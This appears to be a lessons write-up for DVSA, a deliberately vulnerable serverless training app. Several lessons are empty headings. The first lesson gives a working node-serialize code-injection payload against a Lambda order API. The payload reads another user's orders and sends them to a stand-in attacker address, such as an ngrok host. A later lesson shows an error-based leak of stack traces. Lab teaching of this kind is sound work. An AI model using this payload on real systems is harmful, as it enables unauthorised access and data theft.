# LESSONS

## LESSON #1: Event Injection

### Code Injection via API Gateway
The application sends all request to an API GW (*https://{string}.execute-api.{region}.amazonaws.com/{stage}/order*). 
All reqursts end up being handled by Lambda function, which invokes another lambda based on the incoming request.

**This function is vulnerable to Code Injection**. The function uses an insecure de-/serialization for the data in the request.

Using the following payload, it is possible to inject code that will be executed by the functioin.
```$$ND_FUNC$$_function (){}()```

For example, to get the orders of another user, we can send the payload:
```
{"action": "_$$ND_FUNC$$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p = {FunctionName: \"DVSA-ORDER-ORDERS\", InvocationType: \"RequestResponse\", Payload: JSON.stringify({\"user\": \"12312312-1233-1233-1233-123123123123\"})};lambda.invoke(p,function(e,d){ var h=require(\"http\");h.get(\"<ATTACKER_REMOTE_ADDRESS>\"+JSON.stringify(d));}); }()", "cart-id":""}
```
Where the *12312312-1233-1233-1233-123123123123* is the user-id of the user we want to steal the data from, and *<ATTACKER_REMOTE_ADDRESS>* is any address that we can send the data to. E.g. [ngrok](https://ngrok.com/).

The result will be a url-encoded json with the order information we stole:
![alt ngrok](https://i.imgur.com/RjT10B4.png)

After decode it, we get a JSON with the user orders. For example:
```
{"StatusCode":200,"ExecutedVersion":"$LATEST","Payload":"{\"status\": \"ok\", \"orders\": [{\"date\": 0, \"status\": \"100\", \"total\": 0, \"order-id\": \"37e149f9-7fd5-4eff-8214-39ed05305d29\"}, {\"date\": 0, \"status\": \"100\", \"total\": 0, \"order-id\": \"01c9f783-1ddd-42b4-b6e4-d8dfe18b7807\"}, {\"date\": 0, \"status\": \"100\", \"total\": 0, \"order-id\": \"5679749f-7a44-4c15-b8db-360a988e82e7\"}, {\"date\": 0, \"status\": \"100\", \"total\": 0, \"order-id\": \"fff385ef-0000-fafa-0000-87ee1047dfff\"}]}"}
```


The above exmaple is the least of problems you can do with such an attack. Notice that there also admin functions :)

### Command Injection via S3 bucket




## LESSON #2

## LESSON #3

## LESSON #4

## LESSON #5

## LESSON #6

## LESSON #7

## LESSON #8

## LESSON #9

## LESSON #10: Unhandles Exceptions
The Lmabda that handles the request is a "dumb" function when talking about response message. The function returns back any message that was received from the invoked function. In some cases, sending partial or incorrect data could reveal code or sensitive information if an error is sent back to to the function.

for example, using the partial payload:
```{"action": "get"}```

We will receive an error that reveils vode from the invoked function:
```
{"StatusCode":200,"FunctionError":"Unhandled","ExecutedVersion":"$LATEST","Payload":"{\"stackTrace\": [[\"/var/task/lambda_function.py\", 29, \"lambda_handler\", \"orderId = event[\\\"orderId\\\"]\"]], \"errorType\": \"KeyError\", \"errorMessage\": \"'orderId'\"}"}
```
